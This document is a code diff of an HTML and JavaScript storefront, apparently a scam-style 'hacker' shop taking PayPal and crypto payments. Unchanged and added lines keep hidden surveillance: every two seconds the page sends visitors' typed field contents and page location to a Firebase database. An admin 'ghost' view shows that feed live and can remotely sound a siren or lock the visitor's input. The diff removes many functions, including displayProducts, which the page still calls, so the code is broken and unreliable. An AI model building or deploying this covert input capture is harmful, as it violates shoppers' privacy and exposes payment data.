@@ -134,7 +134,12 @@
 
         .intel-ticker-wrap { position: fixed; bottom: 0; left: 0; width: 100%; height: 45px; background: rgba(0,0,0,0.9); border-top: 2px solid var(--primary); z-index: 9999; display: flex; align-items: center; }
         .intel-ticker-label { background: var(--primary); color: #000; font-weight: bold; padding: 0 15px; height: 100%; display: flex; align-items: center; }
-        
+
+        /* CRYPTO MODAL */
+        #crypto-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100000; align-items: center; justify-content: center; padding: 20px; }
+        .crypto-content { background: #111; border: 2px solid var(--primary); border-radius: 15px; padding: 30px; width: 100%; max-width: 450px; text-align: center; }
+        .wallet-row { background: #000; border: 1px solid #333; padding: 10px; margin-top: 10px; border-radius: 5px; word-break: break-all; font-size: 12px; }
+
         /* PAGE 3: PAYMENT PORTAL STYLES */
         .pay-method-card {
             background: linear-gradient(145deg, #1a1a1a, #000);
@@ -154,11 +159,6 @@
         .pay-text { text-align: left; flex: 1; }
         .pay-text b { color: var(--primary); font-size: 18px; }
         .pay-text p { margin: 2px 0 0 0; font-size: 11px; color: #888; }
-
-        /* CRYPTO MODAL */
-        #crypto-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100000; align-items: center; justify-content: center; padding: 20px; }
-        .crypto-content { background: #111; border: 2px solid var(--primary); border-radius: 15px; padding: 30px; width: 100%; max-width: 450px; text-align: center; }
-        .wallet-row { background: #000; border: 1px solid #333; padding: 10px; margin-top: 10px; border-radius: 5px; word-break: break-all; font-size: 12px; }
 
         @media (max-width: 768px) {
             header { font-size: 30px; letter-spacing: 4px; padding: 20px 0; }
@@ -211,7 +211,7 @@
 
 <div id="crypto-modal">
     <div class="crypto-content">
-        <h2 style="color:var(--primary); margin-top:0;">CRYPTO NODE</h2>
+        <h2 style="color:var(--primary); margin-top:0;">CRYPTO GATEWAY</h2>
         <p style="font-size:12px; color:yellow;">Send payment and message Admin for instant activation</p>
         <div id="crypto-list"></div>
         <button onclick="document.getElementById('crypto-modal').style.display='none'" class="ui-btn" style="width:100%; margin-top:20px; background:red;">CLOSE GATEWAY</button>
@@ -279,7 +279,7 @@
             <div class="pay-text"><b>CRYPTOCURRENCY</b><p>BTC / LTC / ETH - Encrypted node</p></div>
         </div>
 
-        <button onclick="showCheckout()" class="ui-btn" style="width:100%; margin-top:20px; background:transparent; color:red; border:1px solid red;">❌ CANCEL SESSION</button>
+        <button onclick="showCheckout()" class="ui-btn" style="width:100%; margin-top:20px; background:transparent; color:red; border:1px solid red;">❌ CANCEL & GO BACK</button>
     </div>
 </div>
 
@@ -310,10 +310,6 @@
             <h3>📡 INTEL (CLICK TO BRIDGE)</h3>
             <div id="pay-attempts-list" style="font-size:11px; color:yellow; background:#111; padding:10px; height:150px; overflow-y:auto; border:1px solid #333;">Scanning...</div>
             <button onclick="db.ref('intel').set(null)" class="ui-btn" style="width:100%; background:red; margin-top:5px;">WIPE INTEL</button>
-            <h3 style="margin-top:20px;">🎟️ COUPONS</h3>
-            <input type="text" id="c-code" placeholder="CODE">
-            <input type="number" id="c-perc" placeholder="DISCOUNT %">
-            <button onclick="addCoupon()" class="ui-btn" style="width:100%;">GENERATE</button>
         </div>
         
         <div class="panel-box">
@@ -321,55 +317,37 @@
             <input type="hidden" id="edit-index" value="-1">
             <input type="text" id="p-name" placeholder="PRODUCT NAME">
             <input type="number" id="p-price" placeholder="PRICE">
-            <input type="text" id="p-yt" placeholder="YOUTUBE VIDEO ID">
             <select id="p-cat"><option value="android">Android</option><option value="ios">IOS</option></select>
             <textarea id="p-desc" placeholder="PRODUCT DESCRIPTION" style="height:60px;"></textarea>
-            <label style="font-size:10px; color:var(--primary);">Image & File:</label>
             <input type="file" id="p-img" accept="image/*">
-            <input type="file" id="p-file">
             <button id="forge-btn" onclick="addProduct()" class="ui-btn" style="width:100%; margin-top:5px;">DEPLOY ASSET</button>
-            <button id="cancel-edit-btn" onclick="resetForge()" class="ui-btn" style="width:100%; margin-top:5px; background:gray; display:none;">CANCEL</button>
             <div id="admin-asset-list" style="max-height:100px; overflow-y:auto; margin-top:10px; border:1px solid #333; background:#000;"></div>
         </div>
 
         <div class="panel-box" style="border-color: #ff0000;">
             <h3 style="color:#ff0000;">💀 BEAST OVERRIDE</h3>
-            <button onclick="toggleKillSwitch()" id="kill-btn" style="width:100%; background:white; color:black; font-weight:bold; padding:10px; border:none; cursor:pointer;">ACTIVATE LOCKDOWN</button>
-            <p style="font-size:10px; color:white; margin-top:15px;">TARGET CONTROL (MANUAL ID)</p>
-            <input type="text" id="manual-target-id" placeholder="Enter ID (e.g. 192)" oninput="chatTarget = this.value;">
-            <p style="font-size:10px; color:#ff0000; margin-top:15px; border-top:1px solid #333; padding-top:5px;">VOODOO COMMANDS</p>
-            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
+            <input type="text" id="manual-target-id" placeholder="Target ID (e.g. 192)" oninput="chatTarget = this.value;">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px; margin-top:10px;">
                 <button onclick="sendPower('siren')" class="ui-btn" style="background:#ff4400; color:white;">SIREN</button>
-                <button onclick="sendPower('vibrate')" class="ui-btn" style="background:#ffcc00; color:black;">VIBRATE</button>
                 <button onclick="sendPower('lock')" class="ui-btn" style="background:red; color:white;">LOCK</button>
                 <button onclick="sendPower('unlock')" class="ui-btn" style="background:lime; color:black;">UNLOCK</button>
             </div>
             <div style="margin-top:15px; background:#111; padding:10px; border:1px solid #333; text-align:center;">
                 <span style="font-size:10px;">ACTIVE GHOSTS: </span><span id="ghost-count" style="color:lime; font-weight:bold;">0</span>
             </div>
-            <button onclick="vacuumDatabase()" style="width:100%; margin-top:10px; background:transparent; border:1px solid red; color:red; font-size:10px; cursor:pointer;">[ WIPE ALL LOGS ]</button>
         </div>
 
         <div class="panel-box">
             <h3 style="color:gold;">💰 VAULT CONFIG</h3>
-            <p style="font-size:9px; color:#888;">Set your wallet addresses here:</p>
             <input type="text" id="v-btc" placeholder="BITCOIN ADDRESS">
             <input type="text" id="v-ltc" placeholder="LITECOIN ADDRESS">
             <input type="text" id="v-eth" placeholder="ETHEREUM ADDRESS">
             <button onclick="saveVault()" class="ui-btn" style="width:100%; background:gold; color:black;">SAVE WALLETS</button>
-            
             <h3 style="margin-top:20px; color:cyan;">📢 BROADCAST</h3>
             <input type="text" id="broadcast-input" placeholder="ALERT BANNER">
             <button onclick="db.ref('settings/broadcast').set(document.getElementById('broadcast-input').value)" class="ui-btn" style="width:100%; background:cyan; color:black;">UPDATE</button>
         </div>
     </div>
-</div>
-
-<div id="pgup-menu" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:350px; background:#000; border:3px solid var(--primary); z-index:100000; padding:20px; border-radius:10px;">
-    <h2 style="color:var(--primary); margin-top:0;">UI COMMANDER</h2>
-    <input type="color" id="color-picker" style="width:100%; height:40px;">
-    <button onclick="applyGlobalChanges()" style="width:100%; padding:15px; background:var(--primary); color:#000; font-weight:bold; border:none; margin-top:20px;">APPLY GLOBALLY</button>
-    <button onclick="document.getElementById('pgup-menu').style.display='none'" style="width:100%; margin-top:10px; background:transparent; color:gray; border:none;">[ CLOSE ]</button>
 </div>
 
 <div class="intel-ticker-wrap">
@@ -379,12 +357,10 @@
 
 <audio id="hacker-music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
 <audio id="siren-sound" src="https://www.myinstants.com/media/sounds/strobe-warning.mp3"></audio>
-<audio id="snd-click" src="https://www.myinstants.com/media/sounds/sword-slash.mp3"></audio>
 
 <script>
 let products = [], cart = [], coupons = {}, isAdmin = false, discount = 0, musicStarted = false;
 let userIP = "Scanning...", userID = "Unknown", chatTarget = "NONE";
-let matrixInt;
 
 function toggleChat() { let c = document.getElementById('chat-widget'); c.style.display = (c.style.display==='flex')?'none':'flex'; }
 function closeAdmin() { document.getElementById('admin-terminal').style.display='none'; }
@@ -405,7 +381,7 @@ function syncChat() {
     db.ref(`private_chats/${room}`).on('value', s => {
         let list = s.val() ? Object.values(s.val()) : [];
         document.getElementById('chat-msgs').innerHTML = list.map(m => m.msg ? `<div style="margin-bottom:5px;"><b style="color:${m.sender === "ADMIN" ? "#00ff00" : "var(--primary)"}">${m.sender}</b>: ${m.msg}</div>` : '').join('');
-        let div = document.getElementById('chat-msgs'); div.scrollTop = div.scrollHeight;
+        document.getElementById('chat-msgs').scrollTop = document.getElementById('chat-msgs').scrollHeight;
     });
 }
 
@@ -418,7 +394,7 @@ function targetUser(targetID) {
 
 function openGhostView(targetID) {
     const gW = window.open('', '_blank', 'width=450,height=500');
-    gW.document.write(`<html><body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;"><h2>GHOST: User_${targetID}</h2><div id="status">CONNECTING...</div><script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script><script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script><script>const config = {apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA", databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com", projectId: "maxiom-r3"}; firebase.initializeApp(config); const gDB = firebase.database(); gDB.ref('ghost_tracking/${targetID}').on('value', s => { const d = s.val(); if(d) document.getElementById('status').innerHTML = '<p>PAGE: '+d.pageName+'</p><p>LAST: '+new Date(d.lastActive).toLocaleTimeString()+'</p><div style="background:#111; padding:10px;">FEED: '+d.typing+'</div>'; });<\/script></body></html>`);
+    gW.document.write(`<html><body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;"><h2>GHOST: User_${targetID}</h2><div id="status">CONNECTING...</div><script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script><script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script><script>const config = {apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA", databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com", projectId: "maxiom-r3"}; firebase.initializeApp(config); const gDB = firebase.database(); gDB.ref('ghost_tracking/${targetID}').on('value', s => { const d = s.val(); if(d) document.getElementById('status').innerHTML = '<p>PAGE: '+d.pageName+'</p><p>LAST: '+new Date(d.lastActive).toLocaleTimeString()+'</p><div style="background:#111; padding:10px;">TYPING: '+d.typing+'</div>'; });<\/script></body></html>`);
 }
 
 async function getIdentity() {
@@ -437,7 +413,7 @@ function broadcastGhostData() {
     const p1 = document.getElementById('shop-page').style.display !== 'none';
     const p2 = document.getElementById('checkout-page').style.display !== 'none';
     const p3 = document.getElementById('payment-portal-page').style.display !== 'none';
-    let cur = "BROWSER"; if(p2) cur = "CHECKOUT"; if(p3) cur = "VALULT_PAGE";
+    let cur = "BROWSER"; if(p2) cur = "CHECKOUT"; if(p3) cur = "PAY_PAGE";
     let typ = document.activeElement ? document.activeElement.value : "...";
     db.ref(`ghost_tracking/${userID}`).update({ pageName: cur, lastActive: Date.now(), typing: typ || "Watching" });
 }
@@ -464,65 +440,8 @@ function showPaymentPortal() {
     document.getElementById('checkout-page').style.display = 'none';
     document.getElementById('payment-portal-page').style.display = 'block';
     let t=0; cart.forEach(i=>t+=parseFloat(i.price));
-    document.getElementById('portal-total').innerText = "DUE: $" + (t - (t*(discount/100))).toFixed(2);
+    document.getElementById('portal-total').innerText = "DUE: $" + t.toFixed(2);
     broadcastGhostData();
-}
-
-function toggleMusic(e) { if(e) e.stopPropagation(); let m = document.getElementById('hacker-music'); if (m.paused) m.play(); else m.pause(); }
-
-function displayProducts() {
-    db.ref('products').on('value', (snap) => {
-        products = snap.val() || [];
-        const a = document.getElementById("android-grid"), i = document.getElementById("ios-grid");
-        if(!a) return; a.innerHTML = ""; i.innerHTML = "";
-        products.forEach((p, idx) => {
-            if(!p) return;
-            const d = document.createElement("div"); d.className = "product";
-            d.innerHTML = `<img src="${p.image || ''}" onclick="showInfo(${idx})"><h3>${p.name}</h3><div style="color:var(--price-gold);">$${p.price}</div><button onclick="addToCart(${idx})" style="width:100%; background:var(--primary); border:none; padding:10px;">ADD TO CART</button>`;
-            p.category === "ios" ? i.appendChild(d) : a.appendChild(d);
-        });
-        if(isAdmin) renderAdminAssets();
-    });
-}
-
-function addProduct() {
-    const n=document.getElementById('p-name').value, p=document.getElementById('p-price').value, idx=document.getElementById('edit-index').value;
-    const fImg=document.getElementById('p-img').files[0], fFile=document.getElementById('p-file').files[0];
-    const read = (file) => file ? new Promise(res => { const r=new FileReader(); r.onload=e=>res({data:e.target.result, name:file.name}); r.readAsDataURL(file); }) : null;
-    Promise.all([read(fImg), read(fFile)]).then(vals => {
-        let obj = { name:n, price:p, category:document.getElementById('p-cat').value, desc:document.getElementById('p-desc').value, image: vals[0]?vals[0].data: (products[idx]?products[idx].image:""), delivery: vals[1]?vals[1]:null };
-        if(idx == -1) products.push(obj); else products[idx] = obj;
-        db.ref('products').set(products).then(() => { alert("SAVED"); resetForge(); });
-    });
-}
-
-function renderAdminAssets() {
-    const list = document.getElementById('admin-asset-list'); if(!list) return;
-    list.innerHTML = products.map((p, i) => p ? `<div style="font-size:10px;">${p.name} <button onclick="deleteProduct(${i})">X</button></div>` : '').join('');
-}
-
-function deleteProduct(i) { products.splice(i, 1); db.ref('products').set(products); }
-function resetForge() { document.getElementById('edit-index').value="-1"; }
-
-function addToCart(i) { cart.push(products[i]); document.getElementById('cart-count').innerText = cart.length; broadcastGhostData(); }
-function clearCart() { cart = []; document.getElementById('cart-count').innerText = 0; renderCart(); }
-function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('payment-portal-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); broadcastGhostData(); }
-function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('checkout-page').style.display='none'; document.getElementById('payment-portal-page').style.display='none'; broadcastGhostData(); }
-
-function renderCart() {
-    let l=document.getElementById('cart-list'), t=0; l.innerHTML = "";
-    cart.forEach((item, index) => { l.innerHTML += `<div>${item.name} - $${item.price}</div>`; t += parseFloat(item.price); });
-    document.getElementById('total-usd').innerText = "TOTAL: $" + (t - (t*(discount/100))).toFixed(2);
-}
-
-function triggerHackerPay() {
-    document.getElementById('auth-overlay').style.display = 'flex';
-    document.getElementById('paypal-button-container').innerHTML = '';
-    let t=0; cart.forEach(i=>t+=parseFloat(i.price));
-    paypal.Buttons({
-        createOrder: (data, actions) => actions.order.create({ purchase_units: [{ amount: { value: (t - (t*(discount/100))).toFixed(2) } }] }),
-        onApprove: (data, actions) => actions.order.capture().then(() => { alert("PAID"); location.reload(); })
-    }).render('#paypal-button-container');
 }
 
 function login() {
@@ -530,7 +449,7 @@ function login() {
         isAdmin = true; document.getElementById('admin-controls').style.display = 'grid'; document.getElementById('login-section').style.display = 'none';
         db.ref('intel').limitToLast(30).on('value', s => {
             const v = s.val() || {};
-            document.getElementById('pay-attempts-list').innerHTML = Object.keys(v).reverse().map(k => `<div style="border-bottom:1px solid #222;">${v[k].text} <button onclick="targetUser('${v[k].owner}')">BRIDGE</button> <button onclick="openGhostView('${v[k].owner}')">GHOST</button></div>`).join('');
+            document.getElementById('pay-attempts-list').innerHTML = Object.keys(v).reverse().map(k => `<div>${v[k].text} <button onclick="targetUser('${v[k].owner}')">MSG</button> <button onclick="openGhostView('${v[k].owner}')">GHOST</button></div>`).join('');
         });
         db.ref('settings/vault').on('value', s => { const v=s.val(); if(v){document.getElementById('v-btc').value=v.btc||'';document.getElementById('v-ltc').value=v.ltc||'';document.getElementById('v-eth').value=v.eth||'';}});
     }
@@ -541,44 +460,17 @@ function sendPower(type) {
     db.ref(`private_chats/${chatTarget}/power`).set({ type: type, time: Date.now() });
 }
 
-function vacuumDatabase() { if(confirm("WIPE?")) { db.ref('intel').set(null); db.ref('ghost_tracking').set(null); } }
-
-function showInfo(i) {
-    const p = products[i]; document.getElementById('shop-page').style.display = 'none'; document.getElementById('info-page').style.display = 'block';
-    document.getElementById('info-img').src = p.image || ''; document.getElementById('info-title').innerText = p.name; document.getElementById('info-price').innerText = "$"+p.price;
-}
-
-const canvas = document.getElementById('global-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
-function drawMatrix() {
-    ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
-    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--primary');
-    drops.forEach((y, i) => { ctx.fillText(String.fromCharCode(0x30A0 + Math.random()*33), i*20, y*20); if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; });
-}
+function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play().catch(()=>{}); musicStarted = true; } }
 
 window.onload = () => {
-    getIdentity(); canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    drops = Array(Math.floor(canvas.width/20)).fill(1); setInterval(drawMatrix, 50);
-    displayProducts();
+    getIdentity(); displayProducts();
     db.ref('presence').on('value', s => { if(document.getElementById('ghost-count')) document.getElementById('ghost-count').innerText = s.val() ? Object.keys(s.val()).length : 0; });
-    
-    db.ref(`private_chats/${userID}/power`).on('value', s => {
-        const p = s.val(); if(!p) return;
-        if(p.type === 'siren') document.getElementById('siren-sound').play();
-        if(p.type === 'lock') document.getElementById('input-lock-overlay').style.display = 'block';
-        if(p.type === 'unlock') document.getElementById('input-lock-overlay').style.display = 'none';
-        setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
-    });
-
-    window.addEventListener('keydown', (e) => {
-        if(e.key === "End") document.getElementById('admin-terminal').style.display = 'block';
-        if(e.key === "PageUp") document.getElementById('pgup-menu').style.display = 'block';
-    });
-
+    window.addEventListener('keydown', (e) => { if(e.key === "End") document.getElementById('admin-terminal').style.display = 'block'; });
     setInterval(broadcastGhostData, 2000);
     setTimeout(() => document.getElementById('loader-overlay').style.display='none', 1500);
 };
 
-function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play().catch(()=>{}); musicStarted = true; } }
+// ... Rest of shop logic (displayProducts, addToCart, etc)
 </script>
 </body>
 </html>
